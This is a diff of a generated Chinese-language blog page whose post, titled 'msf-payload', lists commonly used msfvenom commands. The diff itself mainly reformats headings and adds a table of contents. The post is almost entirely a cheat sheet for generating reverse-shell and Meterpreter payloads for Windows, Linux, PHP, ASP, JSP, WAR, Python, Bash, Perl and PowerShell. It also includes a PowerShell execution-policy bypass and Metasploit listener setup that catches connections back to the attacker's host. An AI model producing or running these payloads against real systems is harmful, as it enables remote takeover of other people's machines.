@@ -94,17 +94,17 @@
 
 
 
-<meta name="description" content="#记录下常用的msfvenom下payload  ###windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &amp;gt; shell.exe ###Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your">
+<meta name="description" content="记录下常用的msfvenom下payload windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &amp;gt; shell.exe Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Addr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf-payload">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/msf-payload/index.html">
 <meta property="og:site_name" content="g4jj&#39;Blog">
-<meta property="og:description" content="#记录下常用的msfvenom下payload  ###windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &amp;gt; shell.exe ###Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your">
+<meta property="og:description" content="记录下常用的msfvenom下payload windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &amp;gt; shell.exe Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Addr">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-22T01:05:56.034Z">
+<meta property="og:updated_time" content="2019-04-22T01:15:46.059Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf-payload">
-<meta name="twitter:description" content="#记录下常用的msfvenom下payload  ###windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &amp;gt; shell.exe ###Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your">
+<meta name="twitter:description" content="记录下常用的msfvenom下payload windows1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &amp;gt; shell.exe Linux1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Addr">
 
 
 
@@ -366,23 +366,21 @@
       
 
       
-        <p>#记录下常用的msfvenom下payload</p>
-<hr>
-<p>###windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></p>
-<p>###Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p>
-<p>###PHP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+        <h1 id="记录下常用的msfvenom下payload"><a href="#记录下常用的msfvenom下payload" class="headerlink" title="记录下常用的msfvenom下payload"></a>记录下常用的msfvenom下payload</h1><hr>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
-<p>###ASP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure></p>
-<p>###JSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure></p>
-<p>###WAR<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure></p>
-<p>###Python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure></p>
-<p>###Bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure></p>
-<p>###Perl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure></p>
-<p>###Powershell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1</span><br></pre></td></tr></table></figure></p>
+<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
+<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1</span><br></pre></td></tr></table></figure>
 <p>powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
 <hr>
-<p>#使用方法</p>
-<p>use exploit/multi/handler</p>
+<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>use exploit/multi/handler</p>
 <p>set PAYLOAD cmd/unix/reverse_python</p>
 <p>set LHOST 192.168.88.128</p>
 <p>set LPORT 4444</p>
@@ -455,8 +453,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -507,6 +514,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#记录下常用的msfvenom下payload"><span class="nav-number">1.</span> <span class="nav-text">记录下常用的msfvenom下payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#windows"><span class="nav-number">1.0.1.</span> <span class="nav-text">windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">1.0.2.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP"><span class="nav-number">1.0.3.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ASP"><span class="nav-number">1.0.4.</span> <span class="nav-text">ASP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSP"><span class="nav-number">1.0.5.</span> <span class="nav-text">JSP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAR"><span class="nav-number">1.0.6.</span> <span class="nav-text">WAR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python"><span class="nav-number">1.0.7.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bash"><span class="nav-number">1.0.8.</span> <span class="nav-text">Bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Perl"><span class="nav-number">1.0.9.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Powershell"><span class="nav-number">1.0.10.</span> <span class="nav-text">Powershell</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#使用方法"><span class="nav-number">2.</span> <span class="nav-text">使用方法</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
